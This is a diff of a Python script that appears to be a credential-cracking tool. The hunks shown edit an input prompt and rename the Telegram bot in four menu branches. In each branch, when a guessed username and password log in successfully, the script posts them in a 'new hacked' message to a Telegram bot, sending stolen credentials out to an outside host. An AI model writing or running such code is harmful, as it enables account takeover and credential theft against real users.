@@ -35,7 +35,7 @@ print(F+'''
   [F] - By : Amr Elsherif and Shouk mahmoud\n''')
 print(X+' __________________________________________')
 
-AS = input(' \n [⊙] Enter Number : ')
+AS = input(' \n [⊙] Chose Number : ')
 
 if (AS == '1'):
 	user = '1234567890'
@@ -75,7 +75,7 @@ if (AS == '1'):
 		
 		if 'userId' in req_login.text:
 			print(F + username + password + ' Available')
-			tlg = (f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=⌯ ʜɪ ѕɪʀ ɴᴇᴡ ғᴀᴄᴋᴇᴅ ⌯\n— — — — —  — — — — —\n⌯ ᴇᴍᴀɪʟ : {username}\n⌯ ᴘᴀѕѕ : {password}\n— — — — —  — — — — —\nFrom : @Elsherifxxx2bot''')
+			tlg = (f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=⌯ ʜɪ ѕɪʀ ɴᴇᴡ ғᴀᴄᴋᴇᴅ ⌯\n— — — — —  — — — — —\n⌯ ᴇᴍᴀɪʟ : {username}\n⌯ ᴘᴀѕѕ : {password}\n— — — — —  — — — — —\nFrom : @amrelsharif9_bot''')
 			i = requests.post(tlg)
 			
 		else:
@@ -119,7 +119,7 @@ if (AS == '2'):
 		
 		if 'userId' in req_login.text:
 			print(F+username + password + ' Available')
-			tlg = (f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=⌯ ʜɪ ѕɪʀ ɴᴇᴡ ғᴀᴄᴋᴇᴅ ⌯\n— — — — —  — — — — —\n⌯ ᴇᴍᴀɪʟ : {username}\n⌯ ᴘᴀѕѕ : {password}\n— — — — —  — — — — —\nFrom : @Elsherifxxx2bot''')
+			tlg = (f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=⌯ ʜɪ ѕɪʀ ɴᴇᴡ ғᴀᴄᴋᴇᴅ ⌯\n— — — — —  — — — — —\n⌯ ᴇᴍᴀɪʟ : {username}\n⌯ ᴘᴀѕѕ : {password}\n— — — — —  — — — — —\nFrom : @amrelsharif9_bot''')
 			i = requests.post(tlg)
 			
 		else:
@@ -163,7 +163,7 @@ if (AS == '3'):
 		
 		if 'userId' in req_login.text:
 			print(F+username + password + ' Available')
-			tlg = (f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=⌯ ʜɪ ѕɪʀ ɴᴇᴡ ғᴀᴄᴋᴇᴅ ⌯\n— — — — —  — — — — —\n⌯ ᴇᴍᴀɪʟ : {username}\n⌯ ᴘᴀѕѕ : {password}\n— — — — —  — — — — —\nFrom : @Elsherifxxx2bot''')
+			tlg = (f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=⌯ ʜɪ ѕɪʀ ɴᴇᴡ ғᴀᴄᴋᴇᴅ ⌯\n— — — — —  — — — — —\n⌯ ᴇᴍᴀɪʟ : {username}\n⌯ ᴘᴀѕѕ : {password}\n— — — — —  — — — — —\nFrom : @amrelsharif9_bot''')
 			i = requests.post(tlg)
 			
 		else:
@@ -207,7 +207,7 @@ if (AS == '4'):
 		
 		if 'userId' in req_login.text:
 			print(F+username + password + ' Available')
-			tlg = (f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=⌯ ʜɪ ѕɪʀ ɴᴇᴡ ғᴀᴄᴋᴇᴅ ⌯\n— — — — —  — — — — —\n⌯ ᴇᴍᴀɪʟ : {username}\n⌯ ᴘᴀѕѕ : {password}\n— — — — —  — — — — —\nFrom : @Elsherifxxx2bot''')
+			tlg = (f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=⌯ ʜɪ ѕɪʀ ɴᴇᴡ ғᴀᴄᴋᴇᴅ ⌯\n— — — — —  — — — — —\n⌯ ᴇᴍᴀɪʟ : {username}\n⌯ ᴘᴀѕѕ : {password}\n— — — — —  — — — — —\nFrom : @amrelsharif9_bot''')
 			i = requests.post(tlg)
 			
 		else:
